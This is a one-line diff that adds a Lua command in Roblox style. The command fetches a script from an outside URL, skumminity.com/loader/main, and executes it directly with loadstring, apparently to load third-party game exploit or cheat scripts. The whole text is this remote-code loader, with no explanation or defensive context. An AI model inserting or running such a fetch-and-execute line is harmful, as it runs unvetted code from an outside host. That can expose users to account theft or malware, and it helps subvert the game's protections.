@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://skumminity.com/loader/main", true))()
